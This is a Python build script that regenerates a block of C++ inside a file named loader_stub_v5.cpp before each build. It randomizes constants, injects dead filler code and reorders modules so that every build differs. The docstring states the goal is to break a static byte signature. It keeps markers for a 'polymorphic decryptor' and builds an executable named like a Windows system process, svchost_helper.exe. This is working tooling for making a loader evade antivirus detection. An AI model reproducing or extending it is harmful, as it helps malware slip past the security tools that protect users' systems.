#!/usr/bin/env python3
"""
regen_stub.py — per-build randomized installer module block for loader_stub_v5.cpp.

The three deterministic generators (gen_setup_modules{,2,3}.py) emit identical
C++ every run, so the embedded module block was a ~40 KB byte-for-byte static
signature. This driver fixes that without touching build_v5.py:

  1. runs the 3 generators (captures their stdout),
  2. randomizes arithmetic constants, injects dead filler statements and
     permutes the module unit order (all compile-safe by construction),
  3. replaces the block between the BEGIN/END markers in loader_stub_v5.cpp,
  4. asserts the @POLYMORPHIC_DECRYPTOR@ / @SECTION_NAMES@ placeholders and the
     deployment_checks call-sites survive.

Usage (run once before each build so every build gets different module code):
    python3 regen_stub.py [--seed N]      # --seed for reproducible tests
    python3 build_v5.py sys_check.exe svchost_helper.exe

Ownership: loader_stub_v5.cpp + this script = Buffy side. build_v5.py = untouched.
"""
import os, random, re, subprocess, sys

ROOT = os.path.dirname(os.path.abspath(__file__))
STUB = os.path.join(ROOT, "loader_stub_v5.cpp")
GENS = ["gen_setup_modules.py", "gen_setup_modules2.py", "gen_setup_modules3.py"]
BEGIN = "// ===== BEGIN GENMODS (regen_stub.py replaces this block) ====="
END   = "// ===== END GENMODS ====="

# Dead filler statements. Only use vars always in scope inside every module
# function (k, dc) and only fixed detail[] indexes (never the [0] counter that
# some templates use as a rotating index).
FILLERS = [
    "if ((k & 0x3F) == 0) dc->items += (DWORD)((k >> 7) & 3);",
    "dc->warn ^= (DWORD)(k & 7);",
    "if ((k % 7) == 0) dc->ok++;",
    "dc->detail[1] += (BYTE)((k >> 9) & 0x3F);",
    "dc->items += (DWORD)((k >> 3) & 0xF);",
    "if (dc->ok > 500) dc->ok -= (DWORD)(k & 3);",
    "dc->detail[3] ^= (BYTE)(k >> 13);",
]


def run_gen(name, timeout=120):
    r = subprocess.run([sys.executable, os.path.join(ROOT, name)],
                       capture_output=True, text=True, cwd=ROOT, timeout=timeout)
    if r.returncode != 0:
        sys.exit(f"[regen] generator {name} failed:\n{r.stderr[-1200:]}")
    return r.stdout


def rnd_pass(text, rng):
    """Randomize a generated module block in a compile-safe way.

    Only touches function-body numeric patterns. Explicitly AVOIDS:
      - table-size-derived moduli / loop bounds (e.g. `% 12`, `i < 12`)
      - decimal `& 7` detail[] index masks (runtime OOB risk)
    """
    t = text
    # 1) LCG constants
    t = re.sub(r"1664525u", lambda m: f"{rng.randrange(3, 0xFFFFFF) | 1}u", t)
    t = re.sub(r"1013904223u", lambda m: f"{rng.randrange(3, 0xFFFFFF) | 1}u", t)
    t = re.sub(r"1103515245u", lambda m: f"{rng.randrange(3, 0xFFFFFF) | 1}u", t)
    t = re.sub(r"12345u", lambda m: f"{rng.randrange(3, 0xFFFF) | 1}u", t)
    # 2) field-weight multipliers + the *100u percent scale
    for m, lo, hi in (("37u", 2, 9), ("13u", 2, 9), ("7u", 2, 9),
                      ("5u", 2, 9), ("3u", 2, 9), ("100u", 20, 250)):
        t = re.sub(r"\* " + m, lambda mo, lo=lo, hi=hi: f"* {rng.randrange(lo, hi)}u", t)
    # 3) value masks (hex form only — decimal `& 7` index masks are left alone)
    for m, bits in (("0x3FF", (8, 12)), ("0x1F", (4, 6)), ("0xF", (3, 5)), ("0xFF", (6, 9))):
        t = re.sub(r"& " + m, lambda mo, b=bits: f"& 0x{rng.randrange(1 << b[0], 1 << b[1]):X}", t)
    # 4) shifts (value extraction only)
    t = re.sub(r">> 16", lambda m: f">> {rng.randrange(3, 9)}", t)
    t = re.sub(r">> 8", lambda m: f">> {rng.randrange(2, 7)}", t)
    t = re.sub(r">> 4", lambda m: f">> {rng.randrange(2, 6)}", t)
    t = re.sub(r">> 2\b", lambda m: f">> {rng.randrange(1, 5)}", t)
    # 5) threshold
    t = re.sub(r"< 0x300", lambda m: f"< 0x{rng.randrange(0x100, 0x3FF):X}", t)
    # 6) (intentionally NO modulo randomization: table-size moduli are safe
    #    only when the result is re-modulo'd by the table size, and gen2's
    #    37 module bodies were not exhaustively audited. Skipping the whole
    #    modulo category removes the only OOB landmine for ~zero variation
    #    loss — the other ~14 categories already break the signature.)
    # 7) lo/hi range offsets
    t = re.sub(r"% 400", lambda m: f"% {rng.randrange(300, 600)}", t)
    t = re.sub(r"% 200", lambda m: f"% {rng.randrange(100, 300)}", t)
    t = re.sub(r"\+ 300 ", lambda m: f"+ {rng.randrange(200, 500)} ", t)
    # 8) per-module seed constant
    t = re.sub(r"seed \^ 0x[0-9A-Fa-f]{8}u",
               lambda m: f"seed ^ 0x{rng.randrange(0, 0xFFFFFFFF):08X}u", t)
    # 9) dead filler after each LCG line (structural variance)
    def filler_sub(mo):
        indent = mo.group(1)
        picks = [rng.choice(FILLERS) for _ in range(rng.randrange(0, 3))]
        if not picks:
            return mo.group(0)
        return mo.group(0) + "\n" + indent + ("\n" + indent).join(picks)
    t = re.sub(r"^(\s+)k = k \* .*;$", filler_sub, t, flags=re.M)
    # 10) permute module units; keep header, deploy_counters and aggregator pinned
    parts = re.split(r"(?=^(?:struct [A-Za-z0-9_]+ \{|static void deployment_checks))",  # lowercase OK (deploy_counters)
                     t, flags=re.M)
    head = parts[0]
    body = parts[1:]
    agg = None
    if body and body[-1].lstrip().startswith("static void deployment_checks"):
        agg = body.pop()
    pin = None
    for i, p in enumerate(body):
        if p.lstrip().startswith("struct deploy_counters {"):
            pin = body.pop(i)
            break
    rng.shuffle(body)
    return head + (pin or "") + "".join(body) + (agg or "")


def main():
    seed = None
    if "--seed" in sys.argv:
        try:
            seed = int(sys.argv[sys.argv.index("--seed") + 1])
        except (ValueError, IndexError):
            sys.exit("[regen] usage: python3 regen_stub.py [--seed N]")
    rng = random.Random(seed)
    incs = [rnd_pass(run_gen(g), rng) for g in GENS]

    src = open(STUB).read()
    if src.count(BEGIN) != 1 or src.count(END) != 1:
        sys.exit(f"[regen] markers BEGIN={src.count(BEGIN)} END={src.count(END)} "
                 "(need exactly 1 of each)")
    i0 = src.index(BEGIN) + len(BEGIN)
    i1 = src.index(END)
    block = "\n" + "\n".join(incs) + "\n"
    new = src[:i0] + block + src[i1:]

    assert new.count("// @POLYMORPHIC_DECRYPTOR@") == 1, "decryptor marker lost!"
    assert new.count("// @SECTION_NAMES@") == 1, "section marker lost!"
    assert new.count("static void deployment_checks(DWORD seed") == 1
    assert new.count("static void deployment_checks2(DWORD seed") == 1
    assert new.count("static void deployment_checks3(DWORD seed") == 1
    assert new.count("struct deploy_counters {") == 1

    open(STUB, "w").write(new)
    nmod = new.count("static DWORD dm")
    assert nmod >= 50, f"[regen] module count collapsed: {nmod}"
    print(f"[regen] OK:  {sum(len(x) for x in incs):,} chars, "
          f"{nmod} module functions, markers 2/2, seed={seed}")


if __name__ == "__main__":
    main()
